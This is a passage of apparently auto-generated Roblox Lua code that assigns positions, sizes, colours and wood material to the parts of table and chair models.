        Seat402.CFrame = CFrame.new(-0.800005734, 11855.4502, -21.2000027, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Seat402.Orientation = Vector3.new(0, 180, 0)
        Seat402.Position = Vector3.new(-0.8000057339668274, 11855.4501953125, -21.200002670288086)
        Seat402.Rotation = Vector3.new(-180, 0, -180)
        Seat402.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Seat402.Transparency = 1
        Seat402.Size = Vector3.new(1, 0.20000000298023224, 1)
        Seat402.Anchored = true
        Seat402.BottomSurface = Enum.SurfaceType.Smooth
        Seat402.BrickColor = BrickColor.new("Reddish brown")
        Seat402.Material = Enum.Material.Wood
        Seat402.TopSurface = Enum.SurfaceType.Smooth
        Seat402.brickColor = BrickColor.new("Reddish brown")
        Part403.Parent = Model400
        Part403.CFrame = CFrame.new(-0.800001919, 11855.8506, -22.2999935, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part403.Orientation = Vector3.new(0, 90, 0)
        Part403.Position = Vector3.new(-0.8000019192695618, 11855.8505859375, -22.29999351501465)
        Part403.Rotation = Vector3.new(0, 90, 0)
        Part403.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part403.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part403.Anchored = true
        Part403.BottomSurface = Enum.SurfaceType.Smooth
        Part403.BrickColor = BrickColor.new("Reddish brown")
        Part403.Material = Enum.Material.Wood
        Part403.TopSurface = Enum.SurfaceType.Smooth
        Part403.brickColor = BrickColor.new("Reddish brown")
        Part404.Parent = Model400
        Part404.CFrame = CFrame.new(-0.800001919, 11857.0498, -22.2999935, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part404.Orientation = Vector3.new(0, 90, 0)
        Part404.Position = Vector3.new(-0.8000019192695618, 11857.0498046875, -22.29999351501465)
        Part404.Rotation = Vector3.new(0, 90, 0)
        Part404.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part404.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part404.Anchored = true
        Part404.BottomSurface = Enum.SurfaceType.Smooth
        Part404.BrickColor = BrickColor.new("Reddish brown")
        Part404.Material = Enum.Material.Wood
        Part404.TopSurface = Enum.SurfaceType.Smooth
        Part404.brickColor = BrickColor.new("Reddish brown")
        Part405.Parent = Model400
        Part405.CFrame = CFrame.new(-0.800001919, 11856.6504, -22.2999935, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part405.Orientation = Vector3.new(0, 90, 0)
        Part405.Position = Vector3.new(-0.8000019192695618, 11856.650390625, -22.29999351501465)
        Part405.Rotation = Vector3.new(0, 90, 0)
        Part405.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part405.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part405.Anchored = true
        Part405.BottomSurface = Enum.SurfaceType.Smooth
        Part405.BrickColor = BrickColor.new("Reddish brown")
        Part405.Material = Enum.Material.Wood
        Part405.TopSurface = Enum.SurfaceType.Smooth
        Part405.brickColor = BrickColor.new("Reddish brown")
        Part406.Parent = Model400
        Part406.CFrame = CFrame.new(-0.800001919, 11857.4502, -22.2999935, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part406.Orientation = Vector3.new(0, 90, 0)
        Part406.Position = Vector3.new(-0.8000019192695618, 11857.4501953125, -22.29999351501465)
        Part406.Rotation = Vector3.new(0, 90, 0)
        Part406.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part406.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part406.Anchored = true
        Part406.BottomSurface = Enum.SurfaceType.Smooth
        Part406.BrickColor = BrickColor.new("Reddish brown")
        Part406.Material = Enum.Material.Wood
        Part406.TopSurface = Enum.SurfaceType.Smooth
        Part406.brickColor = BrickColor.new("Reddish brown")
        Part407.Parent = Model400
        Part407.CFrame = CFrame.new(-0.800001919, 11857.8506, -22.2999935, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part407.Orientation = Vector3.new(0, 90, 0)
        Part407.Position = Vector3.new(-0.8000019192695618, 11857.8505859375, -22.29999351501465)
        Part407.Rotation = Vector3.new(0, 90, 0)
        Part407.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part407.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part407.Anchored = true
        Part407.BottomSurface = Enum.SurfaceType.Smooth
        Part407.BrickColor = BrickColor.new("Reddish brown")
        Part407.Material = Enum.Material.Wood
        Part407.TopSurface = Enum.SurfaceType.Smooth
        Part407.brickColor = BrickColor.new("Reddish brown")
        Part408.Parent = Model400
        Part408.CFrame = CFrame.new(-1.90000033, 11856.751, -22.2999935, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part408.Orientation = Vector3.new(0, 90, 0)
        Part408.Position = Vector3.new(-1.9000003337860107, 11856.7509765625, -22.29999351501465)
        Part408.Rotation = Vector3.new(0, 90, 0)
        Part408.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part408.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part408.Anchored = true
        Part408.BottomSurface = Enum.SurfaceType.Smooth
        Part408.BrickColor = BrickColor.new("Reddish brown")
        Part408.Material = Enum.Material.Wood
        Part408.TopSurface = Enum.SurfaceType.Smooth
        Part408.brickColor = BrickColor.new("Reddish brown")
        Part409.Parent = Model400
        Part409.CFrame = CFrame.new(0.29999274, 11856.751, -22.2999916, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part409.Orientation = Vector3.new(0, 90, 0)
        Part409.Position = Vector3.new(0.29999274015426636, 11856.7509765625, -22.299991607666016)
        Part409.Rotation = Vector3.new(0, 90, 0)
        Part409.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part409.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part409.Anchored = true
        Part409.BottomSurface = Enum.SurfaceType.Smooth
        Part409.BrickColor = BrickColor.new("Reddish brown")
        Part409.Material = Enum.Material.Wood
        Part409.TopSurface = Enum.SurfaceType.Smooth
        Part409.brickColor = BrickColor.new("Reddish brown")
        Part410.Parent = Model400
        Part410.CFrame = CFrame.new(-1.90000033, 11854.6504, -22.2999935, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part410.Orientation = Vector3.new(0, 90, 0)
        Part410.Position = Vector3.new(-1.9000003337860107, 11854.650390625, -22.29999351501465)
        Part410.Rotation = Vector3.new(0, 90, 0)
        Part410.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part410.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part410.Anchored = true
        Part410.BottomSurface = Enum.SurfaceType.Smooth
        Part410.BrickColor = BrickColor.new("Reddish brown")
        Part410.Material = Enum.Material.Wood
        Part410.TopSurface = Enum.SurfaceType.Smooth
        Part410.brickColor = BrickColor.new("Reddish brown")
        Part411.Parent = Model400
        Part411.CFrame = CFrame.new(-0.800001919, 11856.251, -22.2999935, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part411.Orientation = Vector3.new(0, 90, 0)
        Part411.Position = Vector3.new(-0.8000019192695618, 11856.2509765625, -22.29999351501465)
        Part411.Rotation = Vector3.new(0, 90, 0)
        Part411.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part411.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part411.Anchored = true
        Part411.BottomSurface = Enum.SurfaceType.Smooth
        Part411.BrickColor = BrickColor.new("Reddish brown")
        Part411.Material = Enum.Material.Wood
        Part411.TopSurface = Enum.SurfaceType.Smooth
        Part411.brickColor = BrickColor.new("Reddish brown")
        Part412.Parent = Model400
        Part412.CFrame = CFrame.new(0.299988925, 11854.6504, -20.0999947, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part412.Orientation = Vector3.new(0, 90, 0)
        Part412.Position = Vector3.new(0.29998892545700073, 11854.650390625, -20.099994659423828)
        Part412.Rotation = Vector3.new(0, 90, 0)
        Part412.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part412.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part412.Anchored = true
        Part412.BottomSurface = Enum.SurfaceType.Smooth
        Part412.BrickColor = BrickColor.new("Reddish brown")
        Part412.Material = Enum.Material.Wood
        Part412.TopSurface = Enum.SurfaceType.Smooth
        Part412.brickColor = BrickColor.new("Reddish brown")
        Part413.Parent = Model400
        Part413.CFrame = CFrame.new(-0.800005734, 11855.4502, -21.2000027, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part413.Orientation = Vector3.new(0, 90, 0)
        Part413.Position = Vector3.new(-0.8000057339668274, 11855.4501953125, -21.200002670288086)
        Part413.Rotation = Vector3.new(0, 90, 0)
        Part413.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part413.Size = Vector3.new(2.4000000953674316, 0.20000004768371582, 2.4000000953674316)
        Part413.Anchored = true
        Part413.BottomSurface = Enum.SurfaceType.Smooth
        Part413.BrickColor = BrickColor.new("Reddish brown")
        Part413.Material = Enum.Material.Wood
        Part413.TopSurface = Enum.SurfaceType.Smooth
        Part413.brickColor = BrickColor.new("Reddish brown")
        Part414.Parent = Model400
        Part414.CFrame = CFrame.new(0.29999274, 11854.6504, -22.2999916, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part414.Orientation = Vector3.new(0, 90, 0)
        Part414.Position = Vector3.new(0.29999274015426636, 11854.650390625, -22.299991607666016)
        Part414.Rotation = Vector3.new(0, 90, 0)
        Part414.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part414.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part414.Anchored = true
        Part414.BottomSurface = Enum.SurfaceType.Smooth
        Part414.BrickColor = BrickColor.new("Reddish brown")
        Part414.Material = Enum.Material.Wood
        Part414.TopSurface = Enum.SurfaceType.Smooth
        Part414.brickColor = BrickColor.new("Reddish brown")
        Model415.Name = "Table"
        Model415.Parent = Model399
        Part416.Parent = Model415
        Part416.CFrame = CFrame.new(-1.89999652, 11855.1504, -19.4999905, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part416.Orientation = Vector3.new(0, 90, 0)
        Part416.Position = Vector3.new(-1.8999965190887451, 11855.150390625, -19.499990463256836)
        Part416.Rotation = Vector3.new(0, 90, 0)
        Part416.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part416.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part416.Anchored = true
        Part416.BottomSurface = Enum.SurfaceType.Smooth
        Part416.BrickColor = BrickColor.new("Reddish brown")
        Part416.Material = Enum.Material.Wood
        Part416.TopSurface = Enum.SurfaceType.Smooth
        Part416.brickColor = BrickColor.new("Reddish brown")
        Part417.Parent = Model415
        Part417.CFrame = CFrame.new(-1.90000033, 11855.1504, -16.4999886, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part417.Orientation = Vector3.new(0, 90, 0)
        Part417.Position = Vector3.new(-1.9000003337860107, 11855.150390625, -16.499988555908203)
        Part417.Rotation = Vector3.new(0, 90, 0)
        Part417.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part417.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part417.Anchored = true
        Part417.BottomSurface = Enum.SurfaceType.Smooth
        Part417.BrickColor = BrickColor.new("Reddish brown")
        Part417.Material = Enum.Material.Wood
        Part417.TopSurface = Enum.SurfaceType.Smooth
        Part417.brickColor = BrickColor.new("Reddish brown")
        Part418.Parent = Model415
        Part418.CFrame = CFrame.new(0.29999274, 11855.1504, -19.4999886, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part418.Orientation = Vector3.new(0, 90, 0)
        Part418.Position = Vector3.new(0.29999274015426636, 11855.150390625, -19.499988555908203)
        Part418.Rotation = Vector3.new(0, 90, 0)
        Part418.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part418.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part418.Anchored = true
        Part418.BottomSurface = Enum.SurfaceType.Smooth
        Part418.BrickColor = BrickColor.new("Reddish brown")
        Part418.Material = Enum.Material.Wood
        Part418.TopSurface = Enum.SurfaceType.Smooth
        Part418.brickColor = BrickColor.new("Reddish brown")
        Part419.Parent = Model415
        Part419.CFrame = CFrame.new(0.299988925, 11855.1504, -16.4999905, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part419.Orientation = Vector3.new(0, 90, 0)
        Part419.Position = Vector3.new(0.29998892545700073, 11855.150390625, -16.499990463256836)
        Part419.Rotation = Vector3.new(0, 90, 0)
        Part419.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part419.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part419.Anchored = true
        Part419.BottomSurface = Enum.SurfaceType.Smooth
        Part419.BrickColor = BrickColor.new("Reddish brown")
        Part419.Material = Enum.Material.Wood
        Part419.TopSurface = Enum.SurfaceType.Smooth
        Part419.brickColor = BrickColor.new("Reddish brown")
        Part420.Parent = Model415
        Part420.CFrame = CFrame.new(-0.800005734, 11856.6504, -17.9999924, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part420.Orientation = Vector3.new(0, 90, 0)
        Part420.Position = Vector3.new(-0.8000057339668274, 11856.650390625, -17.99999237060547)
        Part420.Rotation = Vector3.new(0, 90, 0)
        Part420.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part420.Size = Vector3.new(3.200000047683716, 0.5999999046325684, 2.4000000953674316)
        Part420.Anchored = true
        Part420.BottomSurface = Enum.SurfaceType.Smooth
        Part420.BrickColor = BrickColor.new("Reddish brown")
        Part420.Material = Enum.Material.Wood
        Part420.TopSurface = Enum.SurfaceType.Smooth
        Part420.brickColor = BrickColor.new("Reddish brown")
        Model421.Name = "Chair"
        Model421.Parent = Model399
        Part422.Parent = Model421
        Part422.CFrame = CFrame.new(0.29999274, 11854.6504, -15.8999844, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part422.Orientation = Vector3.new(0, -90, 0)
        Part422.Position = Vector3.new(0.29999274015426636, 11854.650390625, -15.899984359741211)
        Part422.Rotation = Vector3.new(0, -90, 0)
        Part422.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part422.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part422.Anchored = true
        Part422.BottomSurface = Enum.SurfaceType.Smooth
        Part422.BrickColor = BrickColor.new("Reddish brown")
        Part422.Material = Enum.Material.Wood
        Part422.TopSurface = Enum.SurfaceType.Smooth
        Part422.brickColor = BrickColor.new("Reddish brown")
        Seat423.Parent = Model421
        Seat423.CFrame = CFrame.new(-0.800001919, 11855.4502, -14.7999935, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Seat423.Position = Vector3.new(-0.8000019192695618, 11855.4501953125, -14.799993515014648)
        Seat423.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Seat423.Transparency = 1
        Seat423.Size = Vector3.new(1, 0.20000000298023224, 1)
        Seat423.Anchored = true
        Seat423.BottomSurface = Enum.SurfaceType.Smooth
        Seat423.BrickColor = BrickColor.new("Reddish brown")
        Seat423.Material = Enum.Material.Wood
        Seat423.TopSurface = Enum.SurfaceType.Smooth
        Seat423.brickColor = BrickColor.new("Reddish brown")
        Part424.Parent = Model421
        Part424.CFrame = CFrame.new(-0.800005734, 11855.8506, -13.7000046, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part424.Orientation = Vector3.new(0, -90, 0)
        Part424.Position = Vector3.new(-0.8000057339668274, 11855.8505859375, -13.700004577636719)
        Part424.Rotation = Vector3.new(0, -90, 0)
        Part424.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part424.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part424.Anchored = true
        Part424.BottomSurface = Enum.SurfaceType.Smooth
        Part424.BrickColor = BrickColor.new("Reddish brown")
        Part424.Material = Enum.Material.Wood
        Part424.TopSurface = Enum.SurfaceType.Smooth
        Part424.brickColor = BrickColor.new("Reddish brown")
        Part425.Parent = Model421
        Part425.CFrame = CFrame.new(-0.800005734, 11857.0498, -13.7000046, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part425.Orientation = Vector3.new(0, -90, 0)
        Part425.Position = Vector3.new(-0.8000057339668274, 11857.0498046875, -13.700004577636719)
        Part425.Rotation = Vector3.new(0, -90, 0)
        Part425.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part425.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part425.Anchored = true
        Part425.BottomSurface = Enum.SurfaceType.Smooth
        Part425.BrickColor = BrickColor.new("Reddish brown")
        Part425.Material = Enum.Material.Wood
        Part425.TopSurface = Enum.SurfaceType.Smooth
        Part425.brickColor = BrickColor.new("Reddish brown")
        Part426.Parent = Model421
        Part426.CFrame = CFrame.new(-0.800005734, 11856.6504, -13.7000046, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part426.Orientation = Vector3.new(0, -90, 0)
        Part426.Position = Vector3.new(-0.8000057339668274, 11856.650390625, -13.700004577636719)
        Part426.Rotation = Vector3.new(0, -90, 0)
        Part426.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part426.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part426.Anchored = true
        Part426.BottomSurface = Enum.SurfaceType.Smooth
        Part426.BrickColor = BrickColor.new("Reddish brown")
        Part426.Material = Enum.Material.Wood
        Part426.TopSurface = Enum.SurfaceType.Smooth
        Part426.brickColor = BrickColor.new("Reddish brown")
        Part427.Parent = Model421
        Part427.CFrame = CFrame.new(-0.800005734, 11857.4502, -13.7000046, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part427.Orientation = Vector3.new(0, -90, 0)
        Part427.Position = Vector3.new(-0.8000057339668274, 11857.4501953125, -13.700004577636719)
        Part427.Rotation = Vector3.new(0, -90, 0)
        Part427.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part427.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part427.Anchored = true
        Part427.BottomSurface = Enum.SurfaceType.Smooth
        Part427.BrickColor = BrickColor.new("Reddish brown")
        Part427.Material = Enum.Material.Wood
        Part427.TopSurface = Enum.SurfaceType.Smooth
        Part427.brickColor = BrickColor.new("Reddish brown")
        Part428.Parent = Model421
        Part428.CFrame = CFrame.new(-0.800005734, 11857.8506, -13.7000046, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part428.Orientation = Vector3.new(0, -90, 0)
        Part428.Position = Vector3.new(-0.8000057339668274, 11857.8505859375, -13.700004577636719)
        Part428.Rotation = Vector3.new(0, -90, 0)
        Part428.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part428.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part428.Anchored = true
        Part428.BottomSurface = Enum.SurfaceType.Smooth
        Part428.BrickColor = BrickColor.new("Reddish brown")
        Part428.Material = Enum.Material.Wood
        Part428.TopSurface = Enum.SurfaceType.Smooth
        Part428.brickColor = BrickColor.new("Reddish brown")
        Part429.Parent = Model421
        Part429.CFrame = CFrame.new(0.299988925, 11856.751, -13.7000027, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part429.Orientation = Vector3.new(0, -90, 0)
        Part429.Position = Vector3.new(0.29998892545700073, 11856.7509765625, -13.700002670288086)
        Part429.Rotation = Vector3.new(0, -90, 0)
        Part429.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part429.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part429.Anchored = true
        Part429.BottomSurface = Enum.SurfaceType.Smooth
        Part429.BrickColor = BrickColor.new("Reddish brown")
        Part429.Material = Enum.Material.Wood
        Part429.TopSurface = Enum.SurfaceType.Smooth
        Part429.brickColor = BrickColor.new("Reddish brown")
        Part430.Parent = Model421
        Part430.CFrame = CFrame.new(-1.90000033, 11856.751, -13.7000027, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part430.Orientation = Vector3.new(0, -90, 0)
        Part430.Position = Vector3.new(-1.9000003337860107, 11856.7509765625, -13.700002670288086)
        Part430.Rotation = Vector3.new(0, -90, 0)
        Part430.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part430.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part430.Anchored = true
        Part430.BottomSurface = Enum.SurfaceType.Smooth
        Part430.BrickColor = BrickColor.new("Reddish brown")
        Part430.Material = Enum.Material.Wood
        Part430.TopSurface = Enum.SurfaceType.Smooth
        Part430.brickColor = BrickColor.new("Reddish brown")
        Part431.Parent = Model421
        Part431.CFrame = CFrame.new(0.299988925, 11854.6504, -13.7000027, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part431.Orientation = Vector3.new(0, -90, 0)
        Part431.Position = Vector3.new(0.29998892545700073, 11854.650390625, -13.700002670288086)
        Part431.Rotation = Vector3.new(0, -90, 0)
        Part431.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part431.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part431.Anchored = true
        Part431.BottomSurface = Enum.SurfaceType.Smooth
        Part431.BrickColor = BrickColor.new("Reddish brown")
        Part431.Material = Enum.Material.Wood
        Part431.TopSurface = Enum.SurfaceType.Smooth
        Part431.brickColor = BrickColor.new("Reddish brown")
        Part432.Parent = Model421
        Part432.CFrame = CFrame.new(-0.800005734, 11856.251, -13.7000046, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part432.Orientation = Vector3.new(0, -90, 0)
        Part432.Position = Vector3.new(-0.8000057339668274, 11856.2509765625, -13.700004577636719)
        Part432.Rotation = Vector3.new(0, -90, 0)
        Part432.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part432.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part432.Anchored = true
        Part432.BottomSurface = Enum.SurfaceType.Smooth
        Part432.BrickColor = BrickColor.new("Reddish brown")
        Part432.Material = Enum.Material.Wood
        Part432.TopSurface = Enum.SurfaceType.Smooth
        Part432.brickColor = BrickColor.new("Reddish brown")
        Part433.Parent = Model421
        Part433.CFrame = CFrame.new(-1.90000033, 11854.6504, -15.8999825, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part433.Orientation = Vector3.new(0, -90, 0)
        Part433.Position = Vector3.new(-1.9000003337860107, 11854.650390625, -15.899982452392578)
        Part433.Rotation = Vector3.new(0, -90, 0)
        Part433.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part433.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part433.Anchored = true
        Part433.BottomSurface = Enum.SurfaceType.Smooth
        Part433.BrickColor = BrickColor.new("Reddish brown")
        Part433.Material = Enum.Material.Wood
        Part433.TopSurface = Enum.SurfaceType.Smooth
        Part433.brickColor = BrickColor.new("Reddish brown")
        Part434.Parent = Model421
        Part434.CFrame = CFrame.new(-0.800001919, 11855.4502, -14.7999935, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part434.Orientation = Vector3.new(0, -90, 0)
        Part434.Position = Vector3.new(-0.8000019192695618, 11855.4501953125, -14.799993515014648)
        Part434.Rotation = Vector3.new(0, -90, 0)
        Part434.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part434.Size = Vector3.new(2.4000000953674316, 0.20000004768371582, 2.4000000953674316)
        Part434.Anchored = true
        Part434.BottomSurface = Enum.SurfaceType.Smooth
        Part434.BrickColor = BrickColor.new("Reddish brown")
        Part434.Material = Enum.Material.Wood
        Part434.TopSurface = Enum.SurfaceType.Smooth
        Part434.brickColor = BrickColor.new("Reddish brown")
        Part435.Parent = Model421
        Part435.CFrame = CFrame.new(-1.90000033, 11854.6504, -13.7000027, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part435.Orientation = Vector3.new(0, -90, 0)
        Part435.Position = Vector3.new(-1.9000003337860107, 11854.650390625, -13.700002670288086)
        Part435.Rotation = Vector3.new(0, -90, 0)
        Part435.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part435.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part435.Anchored = true
        Part435.BottomSurface = Enum.SurfaceType.Smooth
        Part435.BrickColor = BrickColor.new("Reddish brown")
        Part435.Material = Enum.Material.Wood
        Part435.TopSurface = Enum.SurfaceType.Smooth
        Part435.brickColor = BrickColor.new("Reddish brown")
        Model436.Name = "Chair"
        Model436.Parent = Model399
        Part437.Parent = Model436
        Part437.CFrame = CFrame.new(0.899967849, 11854.6504, -19.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part437.Position = Vector3.new(0.8999678492546082, 11854.650390625, -19.099998474121094)
        Part437.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part437.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part437.Anchored = true
        Part437.BottomSurface = Enum.SurfaceType.Smooth
        Part437.BrickColor = BrickColor.new("Reddish brown")
        Part437.Material = Enum.Material.Wood
        Part437.TopSurface = Enum.SurfaceType.Smooth
        Part437.brickColor = BrickColor.new("Reddish brown")
        Seat438.Parent = Model436
        Seat438.CFrame = CFrame.new(1.99997163, 11855.4502, -17.9999905, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Seat438.Orientation = Vector3.new(0, 90, 0)
        Seat438.Position = Vector3.new(1.999971628189087, 11855.4501953125, -17.999990463256836)
        Seat438.Rotation = Vector3.new(0, 90, 0)
        Seat438.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Seat438.Transparency = 1
        Seat438.Size = Vector3.new(1, 0.20000000298023224, 1)
        Seat438.Anchored = true
        Seat438.BottomSurface = Enum.SurfaceType.Smooth
        Seat438.BrickColor = BrickColor.new("Reddish brown")
        Seat438.Material = Enum.Material.Wood
        Seat438.TopSurface = Enum.SurfaceType.Smooth
        Seat438.brickColor = BrickColor.new("Reddish brown")
        Part439.Parent = Model436
        Part439.CFrame = CFrame.new(3.09996438, 11855.8506, -17.9999924, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part439.Position = Vector3.new(3.0999643802642822, 11855.8505859375, -17.99999237060547)
        Part439.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part439.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part439.Anchored = true
        Part439.BottomSurface = Enum.SurfaceType.Smooth
        Part439.BrickColor = BrickColor.new("Reddish brown")
        Part439.Material = Enum.Material.Wood
        Part439.TopSurface = Enum.SurfaceType.Smooth
        Part439.brickColor = BrickColor.new("Reddish brown")
        Part440.Parent = Model436
        Part440.CFrame = CFrame.new(3.09996438, 11857.0498, -17.9999924, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part440.Position = Vector3.new(3.0999643802642822, 11857.0498046875, -17.99999237060547)
        Part440.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part440.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part440.Anchored = true
        Part440.BottomSurface = Enum.SurfaceType.Smooth
        Part440.BrickColor = BrickColor.new("Reddish brown")
        Part440.Material = Enum.Material.Wood
        Part440.TopSurface = Enum.SurfaceType.Smooth
        Part440.brickColor = BrickColor.new("Reddish brown")
        Part441.Parent = Model436
        Part441.CFrame = CFrame.new(3.09996438, 11856.6504, -17.9999924, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part441.Position = Vector3.new(3.0999643802642822, 11856.650390625, -17.99999237060547)
        Part441.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part441.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part441.Anchored = true
        Part441.BottomSurface = Enum.SurfaceType.Smooth
        Part441.BrickColor = BrickColor.new("Reddish brown")
        Part441.Material = Enum.Material.Wood
        Part441.TopSurface = Enum.SurfaceType.Smooth
        Part441.brickColor = BrickColor.new("Reddish brown")
        Part442.Parent = Model436
        Part442.CFrame = CFrame.new(3.09996438, 11857.4502, -17.9999924, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part442.Position = Vector3.new(3.0999643802642822, 11857.4501953125, -17.99999237060547)
        Part442.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part442.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part442.Anchored = true
        Part442.BottomSurface = Enum.SurfaceType.Smooth
        Part442.BrickColor = BrickColor.new("Reddish brown")
        Part442.Material = Enum.Material.Wood
        Part442.TopSurface = Enum.SurfaceType.Smooth
        Part442.brickColor = BrickColor.new("Reddish brown")
        Part443.Parent = Model436
        Part443.CFrame = CFrame.new(3.09996438, 11857.8506, -17.9999924, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part443.Position = Vector3.new(3.0999643802642822, 11857.8505859375, -17.99999237060547)
        Part443.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part443.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part443.Anchored = true
        Part443.BottomSurface = Enum.SurfaceType.Smooth
        Part443.BrickColor = BrickColor.new("Reddish brown")
        Part443.Material = Enum.Material.Wood
        Part443.TopSurface = Enum.SurfaceType.Smooth
        Part443.brickColor = BrickColor.new("Reddish brown")
        Part444.Parent = Model436
        Part444.CFrame = CFrame.new(3.09996629, 11856.751, -19.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part444.Position = Vector3.new(3.099966287612915, 11856.7509765625, -19.099998474121094)
        Part444.Color = Color3.new(0.411765, 0.25098, 0.156863)
